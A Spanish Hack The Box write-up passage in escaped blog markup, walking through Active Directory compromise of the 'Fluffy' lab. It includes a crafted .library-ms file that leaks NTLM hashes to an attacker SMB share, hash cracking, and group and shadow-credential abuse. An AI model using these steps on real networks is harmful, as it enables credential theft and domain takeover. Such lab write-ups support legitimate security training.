DNS:DC01.certificate.htb\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2024-11-04T03:14:54\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2025-11-04T03:14:54\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e445/tcp   open  microsoft-ds?\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e464/tcp   open  kpasswd5?\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP \u003cspan class=\"o\"\u003e(\u003c/span\u003eDomain: certificate.htb0., Site: Default-First-Site-Name\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eDC01.certificate.htb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"c1\"\u003e#x3C;unsupported\u0026gt;, DNS:DC01.certificate.htb\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2024-11-04T03:14:54\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2025-11-04T03:14:54\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: 2025-08-20T01:43:29+00:00\u003cspan class=\"p\"\u003e;\u003c/span\u003e +7h59m38s from scanner time.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP \u003cspan class=\"o\"\u003e(\u003c/span\u003eDomain: certificate.htb0., Site: Default-First-Site-Name\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: 2025-08-20T01:43:28+00:00\u003cspan class=\"p\"\u003e;\u003c/span\u003e +7h59m38s from scanner time.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eDC01.certificate.htb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"c1\"\u003e#x3C;unsupported\u0026gt;, DNS:DC01.certificate.htb\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2024-11-04T03:14:54\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2025-11-04T03:14:54\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP \u003cspan class=\"o\"\u003e(\u003c/span\u003eDomain: certificate.htb0., Site: Default-First-Site-Name\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eDC01.certificate.htb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"c1\"\u003e#x3C;unsupported\u0026gt;, DNS:DC01.certificate.htb\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2024-11-04T03:14:54\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2025-11-04T03:14:54\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: 2025-08-20T01:43:29+00:00\u003cspan class=\"p\"\u003e;\u003c/span\u003e +7h59m38s from scanner time.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e9389/tcp  open  mc-nmf        .NET Message Framing\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e49666/tcp open  msrpc         Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e49685/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e49686/tcp open  msrpc         Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e49687/tcp open  msrpc         Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e49706/tcp open  msrpc         Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e49712/tcp open  msrpc         Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e49731/tcp open  msrpc         Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eService Info: Hosts: certificate.htb, DC01\u003cspan class=\"p\"\u003e;\u003c/span\u003e OS: Windows\u003cspan class=\"p\"\u003e;\u003c/span\u003e CPE: cpe:/o:microsoft:windows\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost script results:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e smb2-time:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   date: 2025-08-20T01:42:52\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_  start_date: N/A\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e smb2-security-mode:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   3.1.1:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_    Message signing enabled and required\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_clock-skew: mean: 7h59m37s, deviation: 0s, median: 7h59m37s\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNmap \u003cspan class=\"k\"\u003edone\u003c/span\u003e: \u003cspan class=\"m\"\u003e1\u003c/span\u003e IP address \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e host up\u003cspan class=\"o\"\u003e)\u003c/span\u003e scanned in 99.37 seconds\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch1 id=\"enumeraci√≥n-web\"\u003eEnumeraci√≥n web\u003c/h1\u003e\n\u003cp\u003eUna vez entramos dentro a la web, vemos que se trata de una plataforma para aprender en linea. En ella tambi√©n tenemos la capacidad de registrarnos y de iniciar sesi√≥n.\u003c/p\u003e","title":"Certificate"},{"content":"\nReconocimiento Escaneo de puertos abiertos:\n‚ùØ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.69 -oG ports [sudo] contrase√±a para borhub: Host discovery disabled (-Pn). All addresses will be marked \u0026#39;up\u0026#39; and scan times may be slower. Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-25 20:58 CEST Initiating SYN Stealth Scan at 20:58 Scanning 10.10.11.69 [65535 ports] Discovered open port 53/tcp on 10.10.11.69 Discovered open port 139/tcp on 10.10.11.69 Discovered open port 445/tcp on 10.10.11.69 Discovered open port 49678/tcp on 10.10.11.69 Discovered open port 49776/tcp on 10.10.11.69 Discovered open port 49677/tcp on 10.10.11.69 Discovered open port 49680/tcp on 10.10.11.69 Discovered open port 464/tcp on 10.10.11.69 Discovered open port 49667/tcp on 10.10.11.69 Discovered open port 593/tcp on 10.10.11.69 Discovered open port 389/tcp on 10.10.11.69 Discovered open port 3268/tcp on 10.10.11.69 Discovered open port 5985/tcp on 10.10.11.69 Discovered open port 88/tcp on 10.10.11.69 Discovered open port 3269/tcp on 10.10.11.69 Discovered open port 636/tcp on 10.10.11.69 Discovered open port 9389/tcp on 10.10.11.69 Discovered open port 49704/tcp on 10.10.11.69 Discovered open port 49698/tcp on 10.10.11.69 Completed SYN Stealth Scan at 20:59, 26.35s elapsed (65535 total ports) Nmap scan report for 10.10.11.69 Host is up, received user-set (0.035s latency). Scanned at 2025-05-25 20:58:37 CEST for 26s Not shown: 65516 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 53/tcp open domain syn-ack ttl 127 88/tcp open kerberos-sec syn-ack ttl 127 139/tcp open netbios-ssn syn-ack ttl 127 389/tcp open ldap syn-ack ttl 127 445/tcp open microsoft-ds syn-ack ttl 127 464/tcp open kpasswd5 syn-ack ttl 127 593/tcp open http-rpc-epmap syn-ack ttl 127 636/tcp open ldapssl syn-ack ttl 127 3268/tcp open globalcatLDAP syn-ack ttl 127 3269/tcp open globalcatLDAPssl syn-ack ttl 127 5985/tcp open wsman syn-ack ttl 127 9389/tcp open adws syn-ack ttl 127 49667/tcp open unknown syn-ack ttl 127 49677/tcp open unknown syn-ack ttl 127 49678/tcp open unknown syn-ack ttl 127 49680/tcp open unknown syn-ack ttl 127 49698/tcp open unknown syn-ack ttl 127 49704/tcp open unknown syn-ack ttl 127 49776/tcp open unknown syn-ack ttl 127 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 26.40 seconds Raw packets sent: 131065 (5.767MB) | Rcvd: 33 (1.452KB) Escaneo de servicios:\n‚ùØ sudo nmap -sCV -p 53,88,139,389,445,464,593,636,3268,3269,5985,9389,49667,49677,49678,49680,49698,49704,49776 10.10.11.69 -oN targeted Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-25 21:01 CEST Nmap scan report for 10.10.11.69 Host is up (0.098s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-05-26 02:01:08Z) 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name) |_ssl-date: 2025-05-26T02:02:38+00:00; +7h00m00s from scanner time. | ssl-cert: Subject: commonName=DC01.fluffy.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:\u0026lt;unsupported\u0026gt;, DNS:DC01.fluffy.htb | Not valid before: 2025-04-17T16:04:17 |_Not valid after: 2026-04-17T16:04:17 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name) |_ssl-date: 2025-05-26T02:02:38+00:00; +7h00m00s from scanner time. | ssl-cert: Subject: commonName=DC01.fluffy.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:\u0026lt;unsupported\u0026gt;, DNS:DC01.fluffy.htb | Not valid before: 2025-04-17T16:04:17 |_Not valid after: 2026-04-17T16:04:17 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name) |_ssl-date: 2025-05-26T02:02:38+00:00; +7h00m00s from scanner time. | ssl-cert: Subject: commonName=DC01.fluffy.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:\u0026lt;unsupported\u0026gt;, DNS:DC01.fluffy.htb | Not valid before: 2025-04-17T16:04:17 |_Not valid after: 2026-04-17T16:04:17 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC01.fluffy.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:\u0026lt;unsupported\u0026gt;, DNS:DC01.fluffy.htb | Not valid before: 2025-04-17T16:04:17 |_Not valid after: 2026-04-17T16:04:17 |_ssl-date: 2025-05-26T02:02:38+00:00; +7h00m00s from scanner time. 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 49667/tcp open msrpc Microsoft Windows RPC 49677/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49678/tcp open msrpc Microsoft Windows RPC 49680/tcp open msrpc Microsoft Windows RPC 49698/tcp open msrpc Microsoft Windows RPC 49704/tcp open msrpc Microsoft Windows RPC 49776/tcp open msrpc Microsoft Windows RPC Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required | smb2-time: | date: 2025-05-26T02:01:58 |_ start_date: N/A |_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 97.68 seconds SMB Enumeration Listado de recursos compartidos con smbclient:\n‚ùØ smbclient -N -L \\\\\\\\10.10.11.69 Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC IT Disk NETLOGON Disk Logon server share SYSVOL Disk Logon server share SMB1 disabled -- no workgroup available Uso de netexec para listar las carpetas compartidas pero esta vez con las credenciales que tenemos.\n‚ùØ nxc smb 10.10.11.69 -u \u0026#39;j.fleischman\u0026#39; -p \u0026#39;J0elTHEM4n1990!\u0026#39; --shares SMB 10.10.11.69 445 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False) SMB 10.10.11.69 445 DC01 [+] fluffy.htb\\j.fleischman:J0elTHEM4n1990! SMB 10.10.11.69 445 DC01 [*] Enumerated shares SMB 10.10.11.69 445 DC01 Share Permissions Remark SMB 10.10.11.69 445 DC01 ----- ----------- ------ SMB 10.10.11.69 445 DC01 ADMIN$ Remote Admin SMB 10.10.11.69 445 DC01 C$ Default share SMB 10.10.11.69 445 DC01 IPC$ READ Remote IPC SMB 10.10.11.69 445 DC01 IT READ,WRITE SMB 10.10.11.69 445 DC01 NETLOGON READ Logon server share SMB 10.10.11.69 445 DC01 SYSVOL READ Logon server share Listado de usuarios con netexec.\n‚ùØ nxc smb 10.10.11.69 -u \u0026#39;j.fleischman\u0026#39; -p \u0026#39;J0elTHEM4n1990!\u0026#39; --users SMB 10.10.11.69 445 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False) SMB 10.10.11.69 445 DC01 [+] fluffy.htb\\j.fleischman:J0elTHEM4n1990! SMB 10.10.11.69 445 DC01 -Username- -Last PW Set- -BadPW- -Description- SMB 10.10.11.69 445 DC01 Administrator 2025-04-17 15:45:01 0 Built-in account for administering the computer/domain SMB 10.10.11.69 445 DC01 Guest \u0026lt;never\u0026gt; 0 Built-in account for guest access to the computer/domain SMB 10.10.11.69 445 DC01 krbtgt 2025-04-17 16:00:02 0 Key Distribution Center Service Account SMB 10.10.11.69 445 DC01 ca_svc 2025-04-17 16:07:50 0 SMB 10.10.11.69 445 DC01 ldap_svc 2025-04-17 16:17:00 0 SMB 10.10.11.69 445 DC01 p.agila 2025-04-18 14:37:08 0 SMB 10.10.11.69 445 DC01 winrm_svc 2025-05-18 00:51:16 0 SMB 10.10.11.69 445 DC01 j.coffey 2025-04-19 12:09:55 0 SMB 10.10.11.69 445 DC01 j.fleischman 2025-05-16 14:46:55 0 SMB 10.10.11.69 445 DC01 [*] Enumerated 9 local users: FLUFFY Ahora nos conectamos a la carpeta IT para ver que contiene.\n‚ùØ smbclient \\\\\\\\10.10.11.69\\\\IT -U FLUFFY.HTB0\\\\j.fleischman Can\u0026#39;t load /etc/samba/smb.conf - run testparm to debug it Password for [FLUFFY.HTB0\\j.fleischman]: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Mon May 26 02:26:36 2025 .. D 0 Mon May 26 02:26:36 2025 Everything-1.4.1.1026.x64 D 0 Fri Apr 18 17:08:44 2025 Everything-1.4.1.1026.x64.zip A 1827464 Fri Apr 18 17:04:05 2025 KeePass-2.58 D 0 Fri Apr 18 17:08:38 2025 KeePass-2.58.zip A 3225346 Fri Apr 18 17:03:17 2025 Upgrade_Notice.pdf A 169963 Sat May 17 16:31:07 2025 5842943 blocks of size 4096. 2074926 blocks available smb: \\\u0026gt; get Upgrade_Notice.pdf getting file \\Upgrade_Notice.pdf of size 169963 as Upgrade_Notice.pdf (128,8 KiloBytes/sec) (average 128,8 KiloBytes/sec) Vemos que tenemos varios archivos interesantes, primero vamos a ver que contiene el archivo de noticias en pdf.\nDentro del archivo PDF vemos que es un mensaje para los administradores, ya que al parecer han salido varios CVE y les indica que tienen que actualizar el sistema. Mirando los CVE cr√≠ticos vemos que con uno de ellos tenemos la posibilidad de hacer spoofing para obtener hashes NTLM.\nCVE-2025-24071: Vulnerabilidad de Spoofing en Windows File Explorer Esta vulnerabilidad permite a atacantes no autenticados robar hashes NTLM mediante rutas SMB maliciosas.\nPrimero tenemos que crear el zip con el archivo .library-ms:\n#Contenido .library-ms \u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;libraryDescription xmlns=\u0026#34;http://schemas.microsoft.com/windows/2009/library\u0026#34;\u0026gt; \u0026lt;name\u0026gt;@%windir%\\system32\\shell32.dll,-34575\u0026lt;/name\u0026gt; \u0026lt;ownerSID\u0026gt;S-1-5-21-...\u0026lt;/ownerSID\u0026gt; \u0026lt;version\u0026gt;1\u0026lt;/version\u0026gt; \u0026lt;isLibraryPinned\u0026gt;true\u0026lt;/isLibraryPinned\u0026gt; \u0026lt;iconReference\u0026gt;imageres.dll,-1003\u0026lt;/iconReference\u0026gt; \u0026lt;templateInfo\u0026gt; \u0026lt;folderType\u0026gt;{7d49d726-3c21-4f05-99aa-fdc2c9474656}\u0026lt;/folderType\u0026gt; \u0026lt;/templateInfo\u0026gt; \u0026lt;searchConnectorDescriptionList\u0026gt; \u0026lt;searchConnectorDescription\u0026gt; \u0026lt;isDefaultSaveLocation\u0026gt;true\u0026lt;/isDefaultSaveLocation\u0026gt; \u0026lt;isSupported\u0026gt;false\u0026lt;/isSupported\u0026gt; \u0026lt;simpleLocation\u0026gt; \u0026lt;url\u0026gt;\\\\10.10.15.254\\Recurso\u0026lt;/url\u0026gt; \u0026lt;/simpleLocation\u0026gt; \u0026lt;/searchConnectorDescription\u0026gt; \u0026lt;/searchConnectorDescriptionList\u0026gt; \u0026lt;/libraryDescription\u0026gt; #Crear archivo zip ‚ùØ zip archivo.zip .library-ms adding: .library-ms (deflated 50%) Ahora lanzamos el responder para que este en escucha:\n‚ùØ sudo responder -I tun0 -v __ .----.-----.-----.-----.-----.-----.--| |.-----.----. | _| -__|__ --| _ | _ | | _ || -__| _| |__| |_____|_____| __|_____|__|__|_____||_____|__| |__| NBT-NS, LLMNR \u0026amp; MDNS Responder 3.1.5.0 ...SNIP... Una vez tenemos el archivo creado entramos en el smb con el usuario j.fleischman y introducimos el zip en la carpeta compartida.\n‚ùØ smbclient \\\\\\\\10.10.11.69\\\\IT -U FLUFFY.HTB0\\\\j.fleischman smb: \\\u0026gt; put archivo.zip Y una vez enviado el archivo recibimos el hash del usuario p.agila.\n[SMB] NTLMv2-SSP Client : 10.10.11.69 [SMB] NTLMv2-SSP Username : FLUFFY\\p.agila [SMB] NTLMv2-SSP Hash : p.agila::FLUFFY:0d5725cb3993aefb:3E2D99869B1807BC7201A3C72CB70E41:0101000000000000807ACEF0F3CEDB01DFBB958C0D542FA80000000002000800550041005300420001001E00570049004E002D005200360056004F0051004D0049004F0043003500370004003400570049004E002D005200360056004F0051004D0049004F004300350037002E0055004100530042002E004C004F00430041004C000300140055004100530042002E004C004F00430041004C000500140055004100530042002E004C004F00430041004C0007000800807ACEF0F3CEDB01060004000200000008003000300000000000000001000000002000009FC3B061493F30639391BA57147CE34911B4B5984C24BC2A50E33711726D93A70A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003200350034000000000000000000 Ahora craqueamos el hash NTLMv2.\n‚ùØ hashcat -m 5600 --force -a 0 responder.hashes /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt hashcat (v6.2.6) starting You have enabled --force to bypass dangerous warnings and errors! This can hide serious problems and should only be done when debugging. Do not report hashcat issues encountered when using --force. /sys/bus/pci/devices/0000:04:00.0/hwmon/hwmon5/pwm1: No such file or directory OpenCL API (OpenCL 2.1 AMD-APP.dbg (3649.0)) - Platform #1 [Advanced Micro Devices, Inc.] ========================================================================================= * Device #1: AMD Radeon 680M, 7648/15418 MB (6552 MB allocatable), 6MCU Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Rules: 1 Optimizers applied: * Zero-Byte * Not-Iterated * Single-Hash * Single-Salt ATTENTION! Pure (unoptimized) backend kernels selected. Pure kernels can crack longer passwords, but drastically reduce performance. If you want to switch to optimized kernels, append -O to your commandline. See the above message to find out about the exact limits. Watchdog: Temperature abort trigger set to 90c Host memory required for this attack: 105 MB Dictionary cache hit: * Filename..: /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt * Passwords.: 14344384 * Bytes.....: 139921497 * Keyspace..: 14344384 P.AGILA::FLUFFY:0d5725cb3993aefb:3e2d99869b1807bc7201a3c72cb70e41:0101000000000000807acef0f3cedb01dfbb958c0d542fa80000000002000800550041005300420001001e00570049004e002d005200360056004f0051004d0049004f0043003500370004003400570049004e002d005200360056004f0051004d0049004f004300350037002e0055004100530042002e004c004f00430041004c000300140055004100530042002e004c004f00430041004c000500140055004100530042002e004c004f00430041004c0007000800807acef0f3cedb01060004000200000008003000300000000000000001000000002000009fc3b061493f30639391ba57147ce34911b4b5984c24bc2a50e33711726d93a70a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310035002e003200350034000000000000000000:prometheusx-303 Session..........: hashcat Status...........: Cracked Hash.Mode........: 5600 (NetNTLMv2) Hash.Target......: P.AGILA::FLUFFY:0d5725cb3993aefb:3e2d99869b1807bc72...000000 Time.Started.....: Tue May 27 11:45:03 2025, (1 sec) Time.Estimated...: Tue May 27 11:45:04 2025, (0 secs) Kernel.Feature...: Pure Kernel Guess.Base.......: File (/usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 11806.1 kH/s (7.08ms) @ Accel:2048 Loops:1 Thr:32 Vec:1 Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new) Progress.........: 4718592/14344384 (32.90%) Rejected.........: 0/4718592 (0.00%) Restore.Point....: 4325376/14344384 (30.15%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidate.Engine.: Device Generator Candidates.#1....: redskins127 -\u0026gt; peque√±atraviesa Hardware.Mon.#1..: Temp: 61c Util: 0% Core: 533MHz Mem:2400MHz Bus:16 Started: Tue May 27 11:44:44 2025 Stopped: Tue May 27 11:45:05 2025 Bloodhound Enumeration Ahora con el nuevo usuario, vamos a lanzar el comando bloodhoun-python con el cual podremos enumerar el dominio en BloodhoundCE.\n‚ùØ bloodhound-python -u p.agila -p \u0026#39;prometheusx-303\u0026#39; -d fluffy.htb -ns 10.10.11.69 -c all --zip INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3) INFO: Found AD domain: fluffy.htb INFO: Getting TGT for user WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.fluffy.htb:88)] [Errno -2] Name or service not known INFO: Connecting to LDAP server: dc01.fluffy.htb INFO: Found 1 domains INFO: Found 1 domains in the forest INFO: Found 1 computers INFO: Connecting to LDAP server: dc01.fluffy.htb INFO: Found 10 users INFO: Found 54 groups INFO: Found 2 gpos INFO: Found 1 ous INFO: Found 19 containers INFO: Found 0 trusts INFO: Starting computer enumeration with 10 workers INFO: Querying computer: DC01.fluffy.htb INFO: Done in 00M 17S INFO: Compressing output into 20250527133042_bloodhound.zip Vemos que el bloodhound nos indica que el usuario p.agila es miembro de SERVICES ACCOUNTS MANAGER y ese grupo tiene permisos genericALL sobre el grupo SERVICES ACCOUNTS que tiene permisos genericWrite sobre 3 cuentas.\nAbusing GenericAll - BloodyAD P.AGILA no tiene los permisos de SERVICE ACCOUNTS, as√≠ que necesitamos heredar los permisos. Para ello como p.agila tiene permisos genericALL sobre SERVICE ACCOUNTS, vamos a a√±adirlo al grupo mediante bloodyAD.\nexegol-default /workspace $ bloodyAD --host 10.10.11.69 -d fluffy.htb -u \u0026#39;p.agila\u0026#39; -p \u0026#39;prometheusx-303\u0026#39; add groupMember \u0026#39;service accounts\u0026#39; \u0026#39;p.agila\u0026#39; [+] p.agila added to service accounts Una vez p.agila es miembro del grupo SERVICE ACCOUNTS tenemos la posibilidad de realizar dos ataques.\nEl ataque kerberoast para tratar de conseguir los hash kerberos y luego craquearlos para conseguir las credenciales\nRealizar un shadow credential attack para autentificarse mediante la clave msDS-KeyCredentialLink.\nUser ca_svc - Abusing GenericWrite - Shadow credential attack (pywhisker) exegol-default /workspace $ pywhisker --dc-ip 10.10.11.69 -d \u0026#34;fluffy.htb\u0026#34; -u \u0026#34;p.agila\u0026#34; -p \u0026#34;prometheusx-303\u0026#34; --target \u0026#34;ca_svc\u0026#34; --action \u0026#34;add\u0026#34; [*] Searching for the target account [*] Target user found: CN=certificate authority service,CN=Users,DC=fluffy,DC=htb [*] Generating certificate [*] Certificate generated [*] Generating KeyCredential [*] KeyCredential generated with DeviceID: fb6f89f1-ff91-3711-b5d3-790d5a094c8f [*] Updating the msDS-KeyCredentialLink attribute of ca_svc [+] Updated the msDS-KeyCredentialLink attribute of the target object [*] Converting 